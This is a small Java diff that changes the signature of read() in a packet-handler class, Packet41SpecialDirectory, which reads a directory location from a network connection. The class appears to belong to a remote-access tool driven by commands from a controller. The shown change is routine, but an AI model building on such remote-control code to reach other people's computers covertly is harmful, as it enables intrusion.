@@ -8,7 +8,7 @@ import com.redpois0n.oslib.OperatingSystem;
 public class Packet41SpecialDirectory extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String location = Connection.instance.readLine();
 
 		String ret = null;
